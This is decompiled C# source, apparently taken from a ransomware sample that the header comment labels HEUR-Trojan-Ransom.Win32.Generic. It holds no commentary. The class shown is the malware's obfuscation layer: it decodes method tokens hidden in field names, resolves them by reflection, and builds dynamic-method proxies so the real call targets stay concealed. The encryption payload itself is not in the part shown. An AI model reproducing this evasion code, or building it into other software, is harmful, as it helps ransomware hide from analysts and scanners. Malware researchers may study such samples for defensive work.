// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Microsoft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 812CF5F4-80B3-4F9B-A390-E995C930E6CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-1f1acdf902ef68a02ea937e0ad033eb0cbf7b87bf124bfc1e2a141153c50cf4d.exe

using \u0006;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0006
{
  [\u0001.\u0001]
  [\u0003.\u0001]
  internal static class \u0005
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001 = new char[58]
    {
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      '\u007F',
      '\u0080',
      '\u0081',
      '\u0082',
      '\u0083',
      '\u0084',
      '\u0086',
      '\u0087',
      '\u0088',
      '\u0089',
      '\u008A',
      '\u008B',
      '\u008C',
      '\u008D',
      '\u008E',
      '\u008F',
      '\u0090',
      '\u0091',
      '\u0092',
      '\u0093',
      '\u0094',
      '\u0095',
      '\u0096',
      '\u0097',
      '\u0098',
      '\u0099',
      '\u009A',
      '\u009B',
      '\u009C',
      '\u009D',
      '\u009E',
      '\u009F'
    };

    [\u0001.\u0001]
    [\u0002.\u0001]
    [\u0003.\u0001]
    public static unsafe void \u0001([In] int obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(29);
      if (true)
        goto label_41;
label_1:
      Type typeFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(\u0005.\u0001.ResolveTypeHandle(33554433 + obj0));
      }
      catch
      {
        return;
      }
      FieldInfo[] fields = typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
      void* voidPtr;
      *(int*) ((IntPtr) voidPtr + 24) = 0;
      while (*(int*) ((IntPtr) voidPtr + 24) < fields.Length)
      {
        FieldInfo fieldInfo = fields[*(int*) ((IntPtr) voidPtr + 24)];
        string name = fieldInfo.Name;
        *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 0;
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = name.Length - 1;
        MethodInfo methodFromHandle;
        Delegate @delegate;
        ParameterInfo[] parameters;
        Type[] parameterTypes;
        while (true)
        {
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            char ch = name[*(int*) ((IntPtr) voidPtr + 4)];
            if (ch == '~')
            {
              *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 1;
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 8) = 0;
              while (*(int*) ((IntPtr) voidPtr + 8) < 58)
              {
                if ((int) \u0005.\u0001[*(int*) ((IntPtr) voidPtr + 8)] == (int) ch)
                {
                  *(int*) voidPtr = *(int*) voidPtr * 58 + *(int*) ((IntPtr) voidPtr + 8);
                  break;
                }
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              }
              *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
              continue;
            }
          }
          try
          {
            methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0005.\u0001.ResolveMethodHandle(*(int*) voidPtr + 167772161));
          }
          catch
          {
            goto label_39;
          }
          if (methodFromHandle.IsStatic)
          {
            try
            {
              @delegate = Delegate.CreateDelegate(fieldInfo.FieldType, methodFromHandle);
              goto label_37;
            }
            catch (Exception ex)
            {
              goto label_39;
            }
          }
          else
          {
            parameters = methodFromHandle.GetParameters();
            *(int*) ((IntPtr) voidPtr + 12) = parameters.Length + 1;
            parameterTypes = new Type[*(int*) ((IntPtr) voidPtr + 12)];
            parameterTypes[0] = typeof (object);
            *(int*) ((IntPtr) voidPtr + 16) = 1;
            goto label_23;
          }
        }
label_22:
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
label_23:
        if (*(int*) ((IntPtr) voidPtr + 16) < *(int*) ((IntPtr) voidPtr + 12))
        {
          parameterTypes[*(int*) ((IntPtr) voidPtr + 16)] = parameters[*(int*) ((IntPtr) voidPtr + 16) - 1].ParameterType;
          goto label_22;
        }
        else
        {
          DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, typeFromHandle, true);
          ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
          ilGenerator.Emit(OpCodes.Ldarg_0);
          if (*(int*) ((IntPtr) voidPtr + 12) > 1)
            ilGenerator.Emit(OpCodes.Ldarg_1);
          if (*(int*) ((IntPtr) voidPtr + 12) > 2)
            ilGenerator.Emit(OpCodes.Ldarg_2);
          if (*(int*) ((IntPtr) voidPtr + 12) > 3)
            ilGenerator.Emit(OpCodes.Ldarg_3);
          if (*(int*) ((IntPtr) voidPtr + 12) > 4)
          {
            *(int*) ((IntPtr) voidPtr + 20) = 4;
            while (*(int*) ((IntPtr) voidPtr + 20) < *(int*) ((IntPtr) voidPtr + 12))
            {
              ilGenerator.Emit(OpCodes.Ldarg_S, *(int*) ((IntPtr) voidPtr + 20));
              *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
            }
          }
          ilGenerator.Emit(OpCodes.Tailcall);
          ilGenerator.Emit(*(sbyte*) ((IntPtr) voidPtr + 28) != (sbyte) 0 ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
          ilGenerator.Emit(OpCodes.Ret);
          try
          {
            @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
          }
          catch
          {
            goto label_39;
          }
        }
label_37:
        try
        {
          fieldInfo.SetValue((object) null, (object) @delegate);
        }
        catch
        {
        }
label_39:
        *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 24) + 1;
      }
      return;
label_41:
      voidPtr = (void*) num;
      goto label_1;
    }

    static \u0005()
    {
      do
      {
        Type type;
        if (true)
          type = typeof (MulticastDelegate);
        if ((object) type != null)
          goto label_6;
label_5:
        continue;
label_6:
        \u0005.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
        goto label_5;
      }
      while (false);
    }
  }
}
